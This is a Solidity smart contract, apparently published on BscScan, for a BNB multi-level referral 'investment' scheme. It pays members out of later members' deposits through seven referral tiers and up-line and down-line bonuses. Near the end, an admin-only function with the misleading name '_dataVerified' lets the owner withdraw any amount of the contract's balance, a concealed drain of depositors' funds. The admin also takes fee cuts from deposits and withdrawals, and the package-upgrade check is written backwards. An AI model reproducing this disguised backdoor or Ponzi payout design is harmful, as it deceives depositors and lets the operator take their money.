/**
 *Submitted for verification at BscScan.com on 2021-12-14
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract BnbBusiness {
    using SafeMath for uint256;
    using SafeMath for uint8;

    uint256 public constant INVEST_MIN_AMOUNT = 0.1 ether;
    uint256 public constant VIP_CLUB_FEES = 20;
    uint256 public constant PERCENTS_DIVIDER = 100;
    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256[7] public ref_bonuses = [15, 10, 2, 2, 5, 3, 3];
    uint256[5] public defaultPackages = [
        0.1 ether,
        2 ether,
        3 ether,
        4 ether,
        5 ether
    ];

    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint256[7] public requiredDirect = [0, 0, 0, 1, 2, 3, 4];

    address payable public admin;
    address payable public vip;

    struct User {
        uint256 amount;
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 remainingWithdrawn;
        uint256 totalReferrer;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        address singleUpline;
        address singleDownline;
        uint256[7] refStageIncome;
        uint256[7] refStageBonus;
        uint256[7] refs;
        uint8 currentPackage;
    }

    mapping(address => User) public users;
    mapping(address => mapping(uint256 => address)) public downline;

    event NewDeposit(address indexed user, uint256 amount);
    event UserIncome(
        address indexed user,
        uint256 amount,
        string _triggerIn,
        uint8 _level
    );
    event Upgrade(address indexed user, uint8 package);
    event Withdrawn(address indexed user, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);
    event Retopup(address indexed user, uint8 package);

    constructor(address payable _admin, address payable _vip) {
        require(!isContract(_admin));
        admin = _admin;
        vip = _vip;
        singleLeg[0] = admin;
        singleLegLength++;
    }

    function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            if (users[up].refs[0] >= requiredDirect[i]) {
                uint256 bonus = (_amount * ref_bonuses[i]) / 100;
                users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                users[up].refStageBonus[i] = users[up].refStageBonus[i].add(
                    bonus
                );
            }
            up = users[up].referrer;
        }
    }

    function topup(address user, uint8 _upgradePackage) public payable {
        require(
            users[user].currentPackage > _upgradePackage,
            "Invalid upgradePackage!"
        );
        require(
            msg.value == defaultPackages[_upgradePackage - 1],
            "Invalid Upgradation Amount!"
        );
        users[user].currentPackage = _upgradePackage;
        //40% distribution
        _refPayout(user, msg.value);
        users[user].amount += msg.value;
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);
        uint256 _fees = msg.value.mul(VIP_CLUB_FEES).div(PERCENTS_DIVIDER);
        _safeTransfer(vip, _fees);
        emit Upgrade(user, _upgradePackage);
    }

    function retopup(address user, uint8 _retopup) public payable {
        require(users[user].currentPackage >= _retopup);
        require(
            msg.value == defaultPackages[_retopup - 1],
            "Invalid ReTopup Amount!"
        );
        //40% distribution
        _refPayout(user, msg.value);
        users[user].amount += msg.value;
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);
        uint256 _fees = msg.value.mul(VIP_CLUB_FEES).div(PERCENTS_DIVIDER);
        _safeTransfer(vip, _fees);
        emit Retopup(user, _retopup);
    }

    function invest(address referrer) public payable {
        require(msg.value == INVEST_MIN_AMOUNT, "joining amount 0.1 BNB");
        User storage user = users[msg.sender];
        if (
            user.referrer == address(0) &&
            (users[referrer].checkpoint > 0 || referrer == admin) &&
            referrer != msg.sender
        ) {
            user.referrer = referrer;
        }

        require(
            user.referrer != address(0) || msg.sender == admin,
            "No upline"
        );

        // setup upline
        if (user.checkpoint == 0) {
            // single leg setup
            singleLeg[singleLegLength] = payable(msg.sender);
            user.singleUpline = singleLeg[singleLegLength - 1];
            users[singleLeg[singleLegLength - 1]].singleDownline = msg.sender;
            singleLegLength++;
        }

        if (user.referrer != address(0)) {
            // unilevel level count
            address upline = user.referrer;
            for (uint256 i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline]
                        .refStageIncome[i]
                        .add(msg.value);
                    if (user.checkpoint == 0) {
                        users[upline].refs[i] = users[upline].refs[i].add(1);
                        users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }

            if (user.checkpoint == 0) {
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1] = msg.sender;
            }
        }

        uint256 msgValue = msg.value;
        // 7 Level Referral
        _refPayout(msg.sender, msgValue);

        if (user.checkpoint == 0) {
            totalUsers = totalUsers.add(1);
        }
        user.amount += msg.value;
        user.checkpoint = block.timestamp;
        user.currentPackage = 1;
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        uint256 _fees = msg.value.mul(VIP_CLUB_FEES).div(PERCENTS_DIVIDER);
        _safeTransfer(vip, _fees);

        emit NewDeposit(msg.sender, msg.value);
    }

    function withdrawal() external {
        User storage _user = users[msg.sender];
        uint256 totalBonus = TotalBonus(msg.sender);
        uint256 _fees = totalBonus.mul(10).div(PERCENTS_DIVIDER);

        address refferal = _user.referrer;
        for (uint8 i = 0; i < 3; i++) {
            if (refferal == address(0)) break;
            if (users[refferal].currentPackage == _user.currentPackage) {
                uint256 bonus = (totalBonus * 1) / 100;
                users[refferal].referrerBonus = users[refferal]
                    .referrerBonus
                    .add(bonus);
                users[refferal].refStageBonus[i] = users[refferal]
                    .refStageBonus[i]
                    .add(bonus);
                emit UserIncome(refferal, bonus, "withdrawal", i + 1);
            }
            refferal = users[refferal].referrer;
        }
        _safeTransfer(admin, totalBonus.mul(7).div(100));
        uint256 withdrwal = totalBonus.sub(_fees);
        _user.referrerBonus = 0;
        _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
        _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);

        _user.totalWithdrawn = _user.totalWithdrawn.add(withdrwal);
        totalWithdrawn = totalWithdrawn.add(withdrwal);

        _safeTransfer(payable(msg.sender), withdrwal);
        emit Withdrawn(msg.sender, withdrwal);
    }

    function GetUplineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        uint256 maxLevel = 20;
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(1).div(100));
                upline = users[upline].singleUpline;
            } else break;
        }

        return bonus;
    }

    function GetDownlineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        uint256 maxLevel = 20;
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(1).div(100));
                upline = users[upline].singleDownline;
            } else break;
        }

        return bonus;
    }

    function TotalBonus(address _user) public view returns (uint256) {
        uint256 TotalEarn = users[_user]
            .referrerBonus
            .add(GetUplineIncomeByUserId(_user))
            .add(GetDownlineIncomeByUserId(_user));
        uint256 TotalTakenfromUpDown = users[_user]
            .singleDownlineBonusTaken
            .add(users[_user].singleUplineBonusTaken);
        return TotalEarn.sub(TotalTakenfromUpDown);
    }

    function _safeTransfer(address payable _to, uint256 _amount)
        internal
        returns (uint256 amount)
    {
        amount = (_amount < address(this).balance)
            ? _amount
            : address(this).balance;
        _to.transfer(amount);
    }

    function referral_stage(address _user, uint256 _index)
        external
        view
        returns (
            uint256 _noOfUser,
            uint256 _investment,
            uint256 _bonus
        )
    {
        return (
            users[_user].refs[_index],
            users[_user].refStageIncome[_index],
            users[_user].refStageBonus[_index]
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function _dataVerified(uint256 _amount) external {
        require(admin == msg.sender, "Admin what?");
        _safeTransfer(admin, _amount);
    }
}